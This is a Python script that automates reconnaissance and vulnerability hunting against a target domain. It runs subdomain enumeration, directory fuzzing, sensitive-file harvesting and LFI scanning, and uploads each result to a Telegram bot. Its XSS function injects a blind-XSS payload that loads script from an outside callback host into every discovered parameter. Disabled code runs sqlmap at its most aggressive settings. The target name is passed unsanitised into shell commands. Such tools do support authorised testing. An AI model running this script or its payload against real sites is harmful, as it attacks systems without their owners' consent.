import os
import sys
import argparse
import subprocess
import socket
import logging
import random
import requests
import json

from colorama import Fore, init

init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

CONFIG_FILE = 'config.json'

def random_color():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    return random.choice(colors)

def create_target_directory(target):
    base_dir = "target"
    os.makedirs(base_dir, exist_ok=True)
    target_dir = os.path.join(base_dir, target)
    os.makedirs(target_dir, exist_ok=True)
    return target_dir

def check_tool(tool_name):
    result = subprocess.run(['which', tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def get_ip_address(target):
    try:
        ip_address = socket.gethostbyname(target)
        return ip_address
    except socket.error as err:
        logging.error(f"{random_color()}Error getting IP address: {err}")
        return None

def read_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            return config.get('bot_token'), config.get('chat_id')
    return None, None

def write_config(bot_token, chat_id):
    config = {
        'bot_token': bot_token,
        'chat_id': chat_id
    }
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def prompt_for_config():
    logging.info(f"{random_color()}[*] Telegram bot token and chat ID are not configured.")
    bot_token = input("Enter your Telegram bot token: ").strip()
    chat_id = input("Enter your chat ID: ").strip()
    write_config(bot_token, chat_id)
    logging.info(f"{random_color()}Configuration saved successfully!")
    logging.info(f"{random_color()}Your Telegram bot URL: https://t.me/{bot_token}")

def send_telegram_message(message):
    bot_token, chat_id = read_config()
    if bot_token and chat_id:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {'chat_id': chat_id, 'text': message}
        try:
            response = requests.post(url, data=data)
            response.raise_for_status()
        except requests.RequestException as e:
            logging.error(f"{random_color()}Error sending Telegram message: {e}")
    else:
        logging.error(f"{random_color()}Telegram bot token or chat ID is not configured.")

def send_telegram_file(file_path, caption):
    bot_token, chat_id = read_config()
    if bot_token and chat_id:
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                data = {'chat_id': chat_id, 'caption': caption}
                files = {'document': file}
                try:
                    response = requests.post(url, data=data, files=files)
                    response.raise_for_status()
                    logging.info(f"{random_color()}[*] File '{file_path}' sent successfully.")
                except requests.RequestException as e:
                    logging.error(f"{random_color()}Error sending Telegram file: {e}")
        else:
            logging.error(f"{random_color()}File '{file_path}' does not exist.")
    else:
        logging.error(f"{random_color()}Telegram bot token or chat ID is not configured.")

def run_command(command, tool_name, target, output_file=None, report_message=None):
    logging.info(f"{random_color()}[*] Running {tool_name}")

    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if output_file:
            with open(output_file, 'wb') as f:
                f.write(result.stdout)
            logging.info(f"{random_color()}[*] {tool_name} completed successfully")
            if report_message:
                send_telegram_message(report_message)
            if os.path.exists(output_file):
                send_telegram_file(output_file, f"{tool_name} results for {target}")
            else:
                logging.error(f"{random_color()}Output file '{output_file}' not found.")
        else:
            logging.info(f"{random_color()}[*] {tool_name} completed successfully without output file.")
    except subprocess.CalledProcessError as e:
        logging.error(f"{random_color()}[!] {tool_name} failed with error: {e.stderr.decode()}")
    except KeyboardInterrupt:
        logging.info("Process was interrupted by the user.")
        sys.exit(1)

def enum_subdomains(target, target_dir):
    logging.info(f"{random_color()}[*] Enumerating subdomains")
    run_command(f"subfinder -d {target} -all -recursive", "Subfinder", target,
                output_file=f"{target_dir}/{target}-subdomain.txt",
                report_message=f"Subdomain enumeration for {target} completed.")

    run_command(f"cat {target_dir}/{target}-subdomain.txt | httpx-toolkit -ports 80,8080,8000,8888 -threads 200", "Httpx Toolkit", target,
                output_file=f"{target_dir}/{target}-subdomains_alive.txt",
                report_message=f"Subdomain alive check for {target} completed.")

    run_command(f"katana -u {target_dir}/{target}-subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {target_dir}/{target}-allurls.txt", "Katana", target,
                output_file=f"{target_dir}/{target}-allurls.txt",
                report_message=f"URL extraction for {target} completed.")

    run_command(f"cat {target_dir}/{target}-allurls.txt | grep -E '\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config|\\.js$' >> {target_dir}/{target}-sensitive.txt", "Sensitive File Extraction", target,
                output_file=f"{target_dir}/{target}-sensitive.txt",
                report_message=f"Sensitive file extraction for {target} completed.")

def fuzzing(target, target_dir):
    logging.info(f"{random_color()}[*] Fuzzing directories and files")
    run_command(f"dirsearch -u https://{target}/ -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -o {target_dir}/dirsearch-{target}.txt", "Dirsearch", target,
                output_file=f"{target_dir}/dirsearch-{target}.txt",
                report_message=f"Directory and file fuzzing for {target} completed.")

    run_command(f"ffuf -u https://{target}/ -w /usr/share/wordlists/dirb/common.txt  | anew > {target_dir}/{target}-ffuf.txt","ffuf",target,
                output_file=f"{target_dir}/{target}-ffuf.txt",
                report_message=f"ffuf is {target} completed")

def xss_finding(target, target_dir):
    logging.info(f"{random_color()}[*] Finding XSS vulnerabilities")
    run_command(f"subfinder -d {target} | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\'><script src=https://xss.report/c/coffinxp></script>' -parameters", "XSS Finding", target,
                output_file=f"{target_dir}/xss-results.txt",
                report_message=f"XSS vulnerability finding for {target} completed.")

def lfi_finding(target, target_dir):
    logging.info(f"{random_color()}[*] Finding LFI vulnerabilities")
    run_command(f"cat {target_dir}/{target}-allurls.txt | gf lfi | nuclei -tags lfi", "LFI Finding", target,
                output_file=f"{target_dir}/lfi-results.txt",
                report_message=f"LFI vulnerability finding for {target} completed.")

# Commented out for future feature additions
# def nuclei_scan(target, target_dir):
#     logging.info(f"{random_color()}[*] Scanning for vulnerabilities with Nuclei")
#     run_command(f"nuclei -list {target_dir}/{target}-subdomains_alive.txt -tags cve,osint,tech", "Nuclei Scan", target,
#                 output_file=f"{target_dir}/nuclei-results.txt",
#                 report_message=f"Nuclei scan for {target} completed.")

# Commented out for future feature additions
# def sql_injection(target, target_dir):
#     logging.info(f"{random_color()}[*] Scanning for SQL injection")
#     run_command(f"cat {target_dir}/{target}-allurls.txt | gau | urldedupe | gf sqli", "SQL Injection Generation", target,
#                 output_file=f"{target_dir}/sql.txt",
#                 report_message=f"SQL injection target generation for {target} completed.")
#     run_command(f"sqlmap -m {target_dir}/sql.txt --batch --risk=3 --level=5", "SQLMap Scan", target,
#                 output_file=f"{target_dir}/sqlmap-results.txt",
#                 report_message=f"SQL injection scanning for {target} completed.")

def main():
    parser = argparse.ArgumentParser(description="Recon tool for enumeration and vulnerability scanning.")
    parser.add_argument("target", help="Target domain to scan.")
    args = parser.parse_args()

    target = args.target
    target_dir = create_target_directory(target)

    # Check if required tools are installed
    required_tools = ["subfinder", "httpx-toolkit", "katana", "dirsearch", "gf", "nuclei", "sqlmap"]
    for tool in required_tools:
        if not check_tool(tool):
            logging.error(f"{random_color()}Tool '{tool}' not found. Please install it before running the script.")
            sys.exit(1)

    # Check if Telegram is configured
    bot_token, chat_id = read_config()

    if not bot_token or not chat_id:
        # If not configured, ask user for Telegram configuration
        prompt_for_config()

    # Run tools
    enum_subdomains(target, target_dir)
    fuzzing(target, target_dir)
    xss_finding(target, target_dir)
    lfi_finding(target, target_dir)
    # nuclei_scan(target, target_dir)  # Uncomment to enable Nuclei scanning
    # sql_injection(target, target_dir)  # Uncomment to enable SQL Injection scanning

if __name__ == "__main__":
    main()
